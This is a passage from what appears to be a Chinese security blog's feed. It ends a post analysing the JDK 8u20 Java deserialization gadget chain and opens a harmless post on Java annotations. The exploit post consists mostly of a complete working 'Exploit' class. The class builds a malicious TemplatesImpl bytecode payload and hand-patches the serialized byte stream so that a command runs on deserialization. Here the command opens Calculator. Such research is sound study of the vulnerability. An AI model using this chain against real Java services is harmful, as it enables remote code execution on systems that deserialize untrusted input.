href="https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/">反序列化流程</a>分析中我们知道：</p><blockquote><p>在反序列化中，如果当前这个对象中的某个字段并没有在字节流中出现，则这些字段会使用类中定义的默认值，<strong>如果这个值出现在字节流中，但是并不属于对象，则抛弃该值，但是如果这个值是一个对象的话，那么会为这个值分配一个 Handle。</strong></p></blockquote><h3 id="关联"><a href="#关联" class="headerlink" title="关联"></a>关联</h3><p>我们在7u21里面用的是LinkedHashSet作为反序列化的source类，我们现在希望有一个可以触发BeanContextSupport的readObject方法。</p><p>所以可以<strong>在LinkedHashSet内部生成一个BeanContextSupport类型的字段</strong>，这样就可以和7u21一样触发字段readObject方法了。</p><p>因为在反序列化流程中，都是先还原对象中字段的值，然后才是objectAnnotation的内容。所以放在这个场景里就是：</p><ol><li><p>还原一个LinkedHashSet</p></li><li><p>还原这个LinkedHashSet中字段的值 </p></li><li><p>如果这个LinkedHashSet中某一个字段是BeanContextSupport类型，那么就会触发BeanContextSupport.readObject</p></li><li><p>这个BeanContextSupport类型的字段本身还有一个字段是AnnotationInvocationHandler类型，所以就又会去触发AnnotationInvocationHandler.readObject</p></li></ol><p>构造可以参考<a href="https://xz.aliyun.com/t/8277#toc-5" target="_blank" rel="noopener">feihong</a>师傅的payload，膜了膜了。</p><h2 id="最终PoC-1"><a href="#最终PoC-1" class="headerlink" title="最终PoC"></a>最终PoC</h2><p>最终payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//_auxClasses为空</span></span><br><span class="line">        Field _auxClasses = TemplatesImpl.class.getDeclaredField("_auxClasses");</span><br><span class="line">        _auxClasses.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _auxClasses.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//_auxClasses为空</span></span><br><span class="line">        Field _tfactory = TemplatesImpl.class.getDeclaredField("_tfactory");</span><br><span class="line">        _tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _tfactory.set(tmpl, TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//整个map,容量为2</span></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap(<span class="number">2</span>);</span><br><span class="line">        String magicStr = <span class="string">"f5a5a608"</span>;</span><br><span class="line">        <span class="comment">// 占位</span></span><br><span class="line">        map.put(magicStr, <span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) cons.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Field type = clazz.getDeclaredField(<span class="string">"type"</span>);</span><br><span class="line">        type.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        type.set(invocationHandler,Templates<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, invocationHandler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//替换为真正的</span></span><br><span class="line">        map.put(magicStr, tmpl);</span><br><span class="line"></span><br><span class="line">        LinkedHashSet set = <span class="keyword">new</span> LinkedHashSet();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将serializable属性修改为0 为了进入readChildren方法</span></span><br><span class="line">        BeanContextSupport bcs = <span class="keyword">new</span> BeanContextSupport();</span><br><span class="line">        Class cc = Class.forName(<span class="string">"java.beans.beancontext.BeanContextSupport"</span>);</span><br><span class="line">        Field serializable = cc.getDeclaredField(<span class="string">"serializable"</span>);</span><br><span class="line">        serializable.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        serializable.set(bcs, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//修改bcs父类的beanContextChildPeer属性设置为bcs自己</span></span><br><span class="line">        Field beanContextChildPeer = cc.getSuperclass().getDeclaredField(<span class="string">"beanContextChildPeer"</span>);</span><br><span class="line">        beanContextChildPeer.set(bcs, bcs);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        set.add(bcs); <span class="comment">// 先加入BeanContextSupport bcs</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//开始写序列化</span></span><br><span class="line">        ByteArrayOutputStream baous = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baous);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(set);</span><br><span class="line">        oos.writeObject(invocationHandler);</span><br><span class="line">        oos.writeObject(tmpl);</span><br><span class="line">        oos.writeObject(proxy);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = baous.toByteArray();</span><br><span class="line">        System.out.println(<span class="string">"[+] Modify HashSet size from  1 to 3"</span>);</span><br><span class="line">        bytes[<span class="number">89</span>] = <span class="number">3</span>; <span class="comment">//修改hashset的长度（元素个数）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//调整 TC_ENDBLOCKDATA 标记的位置</span></span><br><span class="line">        <span class="comment">//0x73 = 115, 0x78 = 120</span></span><br><span class="line">        <span class="comment">//0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(bytes[i] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">1</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">2</span>] == <span class="number">0</span> &amp; bytes[i+<span class="number">3</span>] == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                    bytes[i+<span class="number">4</span>] == <span class="number">120</span> &amp;&amp; bytes[i+<span class="number">5</span>] == <span class="number">120</span> &amp;&amp; bytes[i+<span class="number">6</span>] == <span class="number">115</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">"[+] Delete TC_ENDBLOCKDATA at the end of HashSet"</span>);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i + <span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//将 serializable 的值修改为 1</span></span><br><span class="line">        <span class="comment">//0x73 = 115, 0x78 = 120</span></span><br><span class="line">        <span class="comment">//0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(bytes[i] == <span class="number">120</span> &amp;&amp; bytes[i+<span class="number">1</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">2</span>] == <span class="number">1</span> &amp;&amp; bytes[i+<span class="number">3</span>] == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                    bytes[i+<span class="number">4</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">5</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">6</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">7</span>] == <span class="number">115</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">"[+] Modify BeanContextSupport.serializable from 0 to 1"</span>);</span><br><span class="line">                bytes[i+<span class="number">6</span>] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         TC_BLOCKDATA - 0x77</span></span><br><span class="line"><span class="comment">         Length - 4 - 0x04</span></span><br><span class="line"><span class="comment">         Contents - 0x00000000</span></span><br><span class="line"><span class="comment">         TC_ENDBLOCKDATA - 0x78</span></span><br><span class="line"><span class="comment">         **/</span></span><br><span class="line">        <span class="comment">//把这部分内容先删除，再附加到 AnnotationInvocationHandler 之后</span></span><br><span class="line">        <span class="comment">//目的是让 AnnotationInvocationHandler 变成 BeanContextSupport 的数据流</span></span><br><span class="line">        <span class="comment">//0x77 = 119, 0x78 = 120</span></span><br><span class="line">        <span class="comment">//0x77 for TC_BLOCKDATA, 0x78 for TC_ENDBLOCKDATA</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(bytes[i] == <span class="number">119</span> &amp;&amp; bytes[i+<span class="number">1</span>] == <span class="number">4</span> &amp;&amp; bytes[i+<span class="number">2</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">3</span>] == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                    bytes[i+<span class="number">4</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">5</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">6</span>] == <span class="number">120</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">"[+] Delete TC_BLOCKDATA...int...TC_BLOCKDATA at the End of BeanContextSupport"</span>);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">              serialVersionUID - 0x00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="comment">                  newHandle 0x00 7e 00 28</span></span><br><span class="line"><span class="comment">                  classDescFlags - 0x00 -</span></span><br><span class="line"><span class="comment">                  fieldCount - 0 - 0x00 00</span></span><br><span class="line"><span class="comment">                  classAnnotations</span></span><br><span class="line"><span class="comment">                    TC_ENDBLOCKDATA - 0x78</span></span><br><span class="line"><span class="comment">                  superClassDesc</span></span><br><span class="line"><span class="comment">                    TC_NULL - 0x70</span></span><br><span class="line"><span class="comment">              newHandle 0x00 7e 00 29</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">//0x78 = 120, 0x70 = 112</span></span><br><span class="line">        <span class="comment">//0x78 for TC_ENDBLOCKDATA, 0x70 for TC_NULL</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(bytes[i] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">1</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">2</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">3</span>] == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                    bytes[i + <span class="number">4</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">5</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">6</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">7</span>] == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                    bytes[i+<span class="number">8</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">9</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">10</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">11</span>] == <span class="number">120</span> &amp;&amp;</span><br><span class="line">                    bytes[i+<span class="number">12</span>] == <span class="number">112</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">"[+] Add back previous delte TC_BLOCKDATA...int...TC_BLOCKDATA after invocationHandler"</span>);</span><br><span class="line">                i = i + <span class="number">13</span>;</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="keyword">byte</span>) <span class="number">0x77</span>);</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="keyword">byte</span>) <span class="number">0x04</span>);</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="keyword">byte</span>) <span class="number">0x00</span>);</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="keyword">byte</span>) <span class="number">0x00</span>);</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="keyword">byte</span>) <span class="number">0x00</span>);</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="keyword">byte</span>) <span class="number">0x00</span>);</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="keyword">byte</span>) <span class="number">0x78</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将 sun.reflect.annotation.AnnotationInvocationHandler 的 classDescFlags 由 SC_SERIALIZABLE 修改为 SC_SERIALIZABLE | SC_WRITE_METHOD</span></span><br><span class="line">        <span class="comment">//这一步其实不是通过理论推算出来的，是通过debug 以及查看 pwntester的 poc 发现需要这么改</span></span><br><span class="line">        <span class="comment">//原因是如果不设置 SC_WRITE_METHOD 标志的话 defaultDataEnd = true，导致 BeanContextSupport -&gt; deserialize(ois, bcmListeners = new ArrayList(1))</span></span><br><span class="line">        <span class="comment">// -&gt; count = ois.readInt(); 报错，无法完成整个反序列化流程</span></span><br><span class="line">        <span class="comment">// 没有 SC_WRITE_METHOD 标记，认为这个反序列流到此就结束了</span></span><br><span class="line">        <span class="comment">// 标记： 7375 6e2e 7265 666c 6563 --&gt; sun.reflect...</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(bytes[i] == <span class="number">115</span> &amp;&amp; bytes[i+<span class="number">1</span>] == <span class="number">117</span> &amp;&amp; bytes[i+<span class="number">2</span>] == <span class="number">110</span> &amp;&amp; bytes[i+<span class="number">3</span>] == <span class="number">46</span> &amp;&amp;</span><br><span class="line">                    bytes[i + <span class="number">4</span>] == <span class="number">114</span> &amp;&amp; bytes[i+<span class="number">5</span>] == <span class="number">101</span> &amp;&amp; bytes[i+<span class="number">6</span>] == <span class="number">102</span> &amp;&amp; bytes[i+<span class="number">7</span>] == <span class="number">108</span> )&#123;</span><br><span class="line">                System.out.println(<span class="string">"[+] Modify sun.reflect.annotation.AnnotationInvocationHandler -&gt; classDescFlags from SC_SERIALIZABLE to "</span> +</span><br><span class="line">                        <span class="string">"SC_SERIALIZABLE | SC_WRITE_METHOD"</span>);</span><br><span class="line">                i = i + <span class="number">58</span>;</span><br><span class="line">                bytes[i] = <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//加回之前删除的 TC_BLOCKDATA，表明 HashSet 到此结束</span></span><br><span class="line">        System.out.println(<span class="string">"[+] Add TC_BLOCKDATA at end"</span>);</span><br><span class="line">        bytes = Util.addAtLast(bytes, (<span class="keyword">byte</span>) <span class="number">0x78</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream fous = <span class="keyword">new</span> FileOutputStream(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_jdk8u20.ser"</span>);</span><br><span class="line">        fous.write(bytes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_jdk8u20.ser"</span>));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.anquanke.com/post/id/201762" target="_blank" rel="noopener">lalajun</a>/<a href="https://www.anquanke.com/post/id/82934" target="_blank" rel="noopener">高级利用</a>/<a href="https://www.cnblogs.com/litlife/p/12571787.html#transformedmap" target="_blank" rel="noopener">lazymap</a>/<a href="https://xz.aliyun.com/t/3847#toc-8" target="_blank" rel="noopener">浅析Java序列化和反序列化</a>/</p><p><a href="https://www.guildhab.top/2020/08/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e8-%e8%a7%a3%e5%af%86-ysoserial-commonscollections2-pop-chains/" target="_blank" rel="noopener">javassist</a>/<a href="https://www.guildhab.top/2020/08/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e8-%e8%a7%a3%e5%af%86-ysoserial-commonscollections2-pop-chains/" target="_blank" rel="noopener">B4llo0n</a>/<a href="https://www.anquanke.com/post/id/232592" target="_blank" rel="noopener">anquanke</a>/<a href="https://xz.aliyun.com/t/1756#toc-3" target="_blank" rel="noopener">aliyun</a>/<a href="https://www.freebuf.com/articles/web/214096.html" target="_blank" rel="noopener">平安</a>/<a href="https://paper.seebug.org/1242/#commonscollections-2" target="_blank" rel="noopener">seebug</a></p><p><a href="https://www.anquanke.com/post/id/190468#h3-6" target="_blank" rel="noopener">wh1t3p1g</a>/<a href="https://www.anquanke.com/post/id/240040" target="_blank" rel="noopener">6&amp;7</a>/<a href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/" target="_blank" rel="noopener">b1ngz</a>/<a href="https://xz.aliyun.com/t/6884" target="_blank" rel="noopener">7u21</a>/<a href="https://www.anquanke.com/post/id/207762" target="_blank" rel="noopener">8u20</a>/<a href="https://blog.csdn.net/silentbalanceyh/article/details/8183849" target="_blank" rel="noopener">序列化规范</a>/<a href="https://xz.aliyun.com/t/9566" target="_blank" rel="noopener">8u20</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;温故而知新。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;站在巨人们的肩膀上，总结Java反序列化漏洞利用链，会持续更新。&lt;/p&gt;
&lt;p&gt;同步项目：&lt;a href=&quot;https://github.com/0range228/Gadgets&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Gadgets&lt;/a&gt;     &lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="漏洞分析" scheme="https://0range228.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Java注解</title>
    <link href="https://0range228.github.io/Java%E6%B3%A8%E8%A7%A3/"/>
    <id>https://0range228.github.io/Java%E6%B3%A8%E8%A7%A3/</id>
    <published>2021-05-11T08:06:31.000Z</published>
    <updated>2021-05-11T08:07:18.176Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>事不凝滞,理贵变通。</p></blockquote><p>写框架离不开Java注解，今天来总结。</p><a id="more"></a><h1 id="Java元注解"><a href="#Java元注解" class="headerlink" title="Java元注解"></a>Java元注解</h1><blockquote><p>注解在Java语言中放在  { 类、方法、字段、参数 } 前的一个特殊的“注释”。</p><p>注解是一种用作标注的“元数据”。</p></blockquote><blockquote><p>四个：@Retention @Target @Docuement @Inherited</p></blockquote><p><strong>@Retention</strong>：注解的保留位置　　　　　　　　　</p><p>​    @Retention(RetentionPolicy.SOURCE)   //注解仅存在于源码中，在编译期就被丢掉了，不会被class包含。</p><p>​    @Retention(RetentionPolicy.CLASS)     // 不会加载进JVM，注解会在class字节码文件中存在，但运行时无法获得。</p><p>​    @Retention(RetentionPolicy.RUNTIME)  // 注解会在class字节码文件中存在，在运行时可以通过反射获取到。</p><p><strong>这里如果@Retention未标注，默认是CLASS阶段</strong>。</p><p>通常我们自定义的都是RUNTIME阶段，一定要标注。</p><p><strong>@Target</strong>：注解的作用目标</p><p>​    @Target(ElementType.TYPE)   //接口、类、枚举</p><p>​    @Target(ElementType.FIELD) //字段、枚举的常量</p><p>​    @Target(ElementType.METHOD) //方法</p><p>​    @Target(ElementType.PARAMETER) //方法参数</p><p>​    @Target(ElementType.CONSTRUCTOR)  //构造函数</p><p>​    @Target(ElementType.LOCAL_VARIABLE)//局部变量</p><p>​    @Target(ElementType.ANNOTATION_TYPE)//注解</p><p>​    @Target(ElementType.PACKAGE) ///包   </p><p><strong>@Document</strong>：说明该注解将被包含在javadoc中</p><p><strong>@Inherited</strong>：说明子类可以继承父类中的该注解。</p><p>​    @Inherited仅针对@Target(ElementType.TYPE)类型的注解有效，并且仅针对类的继承，对接口的继承无效。</p><h1 id="Java注解的使用"><a href="#Java注解的使用" class="headerlink" title="Java注解的使用"></a>Java注解的使用</h1><p>写个小demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Target</span>(ElementType.METHOD)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Report &#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">id</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">type</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line">    <span class="function">String <span class="title">level</span><span class="params">()</span> <span class="keyword">default</span> "info"</span>;</span><br><span class="line">    <span class="function">String <span class="title">value</span><span 